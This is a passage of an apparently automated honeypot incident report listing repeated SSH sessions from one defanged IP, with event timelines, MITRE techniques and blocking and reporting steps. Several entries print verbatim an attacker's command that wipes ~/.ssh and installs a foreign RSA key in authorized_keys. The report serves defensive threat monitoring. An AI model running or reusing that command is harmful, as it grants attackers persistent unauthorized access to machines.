| `2026-04-30 12:58:44` | `cowrie.command.failed` |
| `2026-04-30 12:58:44` | `cowrie.log.closed` |
| `2026-04-30 12:58:45` | `cowrie.session.params` |
| `2026-04-30 12:58:45` | `cowrie.command.input` |
| `2026-04-30 12:58:45` | `cowrie.session.file_download` |
| `2026-04-30 12:58:45` | `cowrie.log.closed` |
| `2026-04-30 12:58:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7967957e91b

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 12:58 |
| **Last Seen** | 2026-04-30 12:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 12:58:48` | `cowrie.session.connect` |
| `2026-04-30 12:58:48` | `cowrie.client.version` |
| `2026-04-30 12:58:48` | `cowrie.client.kex` |
| `2026-04-30 12:58:49` | `cowrie.login.success` |
| `2026-04-30 12:58:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b29e9c90996b

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 12:59 |
| **Last Seen** | 2026-04-30 12:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 12:59:31` | `cowrie.session.connect` |
| `2026-04-30 12:59:31` | `cowrie.client.version` |
| `2026-04-30 12:59:31` | `cowrie.client.kex` |
| `2026-04-30 12:59:32` | `cowrie.login.success` |
| `2026-04-30 12:59:32` | `cowrie.session.params` |
| `2026-04-30 12:59:32` | `cowrie.command.input` |
| `2026-04-30 12:59:32` | `cowrie.command.failed` |
| `2026-04-30 12:59:32` | `cowrie.log.closed` |
| `2026-04-30 12:59:33` | `cowrie.session.params` |
| `2026-04-30 12:59:33` | `cowrie.command.input` |
| `2026-04-30 12:59:33` | `cowrie.session.file_download` |
| `2026-04-30 12:59:33` | `cowrie.log.closed` |
| `2026-04-30 12:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce3c95cf81c2

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 12:59 |
| **Last Seen** | 2026-04-30 12:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 12:59:36` | `cowrie.session.connect` |
| `2026-04-30 12:59:36` | `cowrie.client.version` |
| `2026-04-30 12:59:36` | `cowrie.client.kex` |
| `2026-04-30 12:59:37` | `cowrie.login.success` |
| `2026-04-30 12:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21ac54114474

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:00 |
| **Last Seen** | 2026-04-30 13:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:00:22` | `cowrie.session.connect` |
| `2026-04-30 13:00:22` | `cowrie.client.version` |
| `2026-04-30 13:00:22` | `cowrie.client.kex` |
| `2026-04-30 13:00:23` | `cowrie.login.success` |
| `2026-04-30 13:00:23` | `cowrie.session.params` |
| `2026-04-30 13:00:23` | `cowrie.command.input` |
| `2026-04-30 13:00:23` | `cowrie.command.failed` |
| `2026-04-30 13:00:23` | `cowrie.log.closed` |
| `2026-04-30 13:00:24` | `cowrie.session.params` |
| `2026-04-30 13:00:24` | `cowrie.command.input` |
| `2026-04-30 13:00:24` | `cowrie.session.file_download` |
| `2026-04-30 13:00:24` | `cowrie.log.closed` |
| `2026-04-30 13:00:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-496c060beabe

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:00 |
| **Last Seen** | 2026-04-30 13:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:00:26` | `cowrie.session.connect` |
| `2026-04-30 13:00:26` | `cowrie.client.version` |
| `2026-04-30 13:00:27` | `cowrie.client.kex` |
| `2026-04-30 13:00:27` | `cowrie.login.success` |
| `2026-04-30 13:00:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b4a239e3034

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:01 |
| **Last Seen** | 2026-04-30 13:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:01:14` | `cowrie.session.connect` |
| `2026-04-30 13:01:14` | `cowrie.client.version` |
| `2026-04-30 13:01:15` | `cowrie.client.kex` |
| `2026-04-30 13:01:15` | `cowrie.login.success` |
| `2026-04-30 13:01:16` | `cowrie.session.params` |
| `2026-04-30 13:01:16` | `cowrie.command.input` |
| `2026-04-30 13:01:16` | `cowrie.command.failed` |
| `2026-04-30 13:01:16` | `cowrie.log.closed` |
| `2026-04-30 13:01:16` | `cowrie.session.params` |
| `2026-04-30 13:01:16` | `cowrie.command.input` |
| `2026-04-30 13:01:17` | `cowrie.session.file_download` |
| `2026-04-30 13:01:17` | `cowrie.log.closed` |
| `2026-04-30 13:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3c04800e50d

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:01 |
| **Last Seen** | 2026-04-30 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:01:19` | `cowrie.session.connect` |
| `2026-04-30 13:01:19` | `cowrie.client.version` |
| `2026-04-30 13:01:19` | `cowrie.client.kex` |
| `2026-04-30 13:01:20` | `cowrie.login.success` |
| `2026-04-30 13:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9e05fcc2497

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:02 |
| **Last Seen** | 2026-04-30 13:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:02:59` | `cowrie.session.connect` |
| `2026-04-30 13:02:59` | `cowrie.client.version` |
| `2026-04-30 13:02:59` | `cowrie.client.kex` |
| `2026-04-30 13:03:00` | `cowrie.login.success` |
| `2026-04-30 13:03:00` | `cowrie.session.params` |
| `2026-04-30 13:03:00` | `cowrie.command.input` |
| `2026-04-30 13:03:00` | `cowrie.command.failed` |
| `2026-04-30 13:03:01` | `cowrie.log.closed` |
| `2026-04-30 13:03:01` | `cowrie.session.params` |
| `2026-04-30 13:03:01` | `cowrie.command.input` |
| `2026-04-30 13:03:01` | `cowrie.session.file_download` |
| `2026-04-30 13:03:01` | `cowrie.log.closed` |
| `2026-04-30 13:03:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-854148bc0cf3

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:03 |
| **Last Seen** | 2026-04-30 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:03:04` | `cowrie.session.connect` |
| `2026-04-30 13:03:04` | `cowrie.client.version` |
| `2026-04-30 13:03:04` | `cowrie.client.kex` |
| `2026-04-30 13:03:05` | `cowrie.login.success` |
| `2026-04-30 13:03:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88215f681620

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:03 |
| **Last Seen** | 2026-04-30 13:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:03:51` | `cowrie.session.connect` |
| `2026-04-30 13:03:51` | `cowrie.client.version` |
| `2026-04-30 13:03:52` | `cowrie.client.kex` |
| `2026-04-30 13:03:52` | `cowrie.login.success` |
| `2026-04-30 13:03:53` | `cowrie.session.params` |
| `2026-04-30 13:03:53` | `cowrie.command.input` |
| `2026-04-30 13:03:53` | `cowrie.command.failed` |
| `2026-04-30 13:03:53` | `cowrie.log.closed` |
| `2026-04-30 13:03:54` | `cowrie.session.params` |
| `2026-04-30 13:03:54` | `cowrie.command.input` |
| `2026-04-30 13:03:54` | `cowrie.session.file_download` |
| `2026-04-30 13:03:54` | `cowrie.log.closed` |
| `2026-04-30 13:03:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1f72a6bcdf1

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:03 |
| **Last Seen** | 2026-04-30 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:03:56` | `cowrie.session.connect` |
| `2026-04-30 13:03:56` | `cowrie.client.version` |
| `2026-04-30 13:03:56` | `cowrie.client.kex` |
| `2026-04-30 13:03:57` | `cowrie.login.success` |
| `2026-04-30 13:03:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb4adb3c4854

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:04 |
| **Last Seen** | 2026-04-30 13:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:04:46` | `cowrie.session.connect` |
| `2026-04-30 13:04:46` | `cowrie.client.version` |
| `2026-04-30 13:04:46` | `cowrie.client.kex` |
| `2026-04-30 13:04:47` | `cowrie.login.success` |
| `2026-04-30 13:04:47` | `cowrie.session.params` |
| `2026-04-30 13:04:47` | `cowrie.command.input` |
| `2026-04-30 13:04:47` | `cowrie.command.failed` |
| `2026-04-30 13:04:47` | `cowrie.log.closed` |
| `2026-04-30 13:04:48` | `cowrie.session.params` |
| `2026-04-30 13:04:48` | `cowrie.command.input` |
| `2026-04-30 13:04:48` | `cowrie.session.file_download` |
| `2026-04-30 13:04:48` | `cowrie.log.closed` |
| `2026-04-30 13:04:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b7ea7b272f0

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:04 |
| **Last Seen** | 2026-04-30 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:04:51` | `cowrie.session.connect` |
| `2026-04-30 13:04:51` | `cowrie.client.version` |
| `2026-04-30 13:04:51` | `cowrie.client.kex` |
| `2026-04-30 13:04:52` | `cowrie.login.success` |
| `2026-04-30 13:04:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-750f9fc51bd6

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:05 |
| **Last Seen** | 2026-04-30 13:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:05:40` | `cowrie.session.connect` |
| `2026-04-30 13:05:40` | `cowrie.client.version` |
| `2026-04-30 13:05:40` | `cowrie.client.kex` |
| `2026-04-30 13:05:41` | `cowrie.login.success` |
| `2026-04-30 13:05:41` | `cowrie.session.params` |
| `2026-04-30 13:05:41` | `cowrie.command.input` |
| `2026-04-30 13:05:41` | `cowrie.command.failed` |
| `2026-04-30 13:05:41` | `cowrie.log.closed` |
| `2026-04-30 13:05:42` | `cowrie.session.params` |
| `2026-04-30 13:05:42` | `cowrie.command.input` |
| `2026-04-30 13:05:42` | `cowrie.session.file_download` |
| `2026-04-30 13:05:42` | `cowrie.log.closed` |
| `2026-04-30 13:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-420a27364001

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:05 |
| **Last Seen** | 2026-04-30 13:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:05:45` | `cowrie.session.connect` |
| `2026-04-30 13:05:45` | `cowrie.client.version` |
| `2026-04-30 13:05:45` | `cowrie.client.kex` |
| `2026-04-30 13:05:45` | `cowrie.login.success` |
| `2026-04-30 13:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad905bcd5c2d

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:08 |
| **Last Seen** | 2026-04-30 13:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:08:20` | `cowrie.session.connect` |
| `2026-04-30 13:08:20` | `cowrie.client.version` |
| `2026-04-30 13:08:20` | `cowrie.client.kex` |
| `2026-04-30 13:08:21` | `cowrie.login.success` |
| `2026-04-30 13:08:21` | `cowrie.session.params` |
| `2026-04-30 13:08:21` | `cowrie.command.input` |
| `2026-04-30 13:08:21` | `cowrie.command.failed` |
| `2026-04-30 13:08:21` | `cowrie.log.closed` |
| `2026-04-30 13:08:22` | `cowrie.session.params` |
| `2026-04-30 13:08:22` | `cowrie.command.input` |
| `2026-04-30 13:08:22` | `cowrie.session.file_download` |
| `2026-04-30 13:08:22` | `cowrie.log.closed` |
| `2026-04-30 13:08:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ae4873d805c

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 13:08 |
| **Last Seen** | 2026-04-30 13:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 13:08:24` | `cowrie.session.connect` |
| `2026-04-30 13:08:24` | `cowrie.client.version` |
| `2026-04-30 13:08:25` | `cowrie.client.kex` |
| `2026-04-30 13:08:25` | `cowrie.login.success` |
| `2026-04-30 13:08:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f37996ff41a

| Field | Detail |
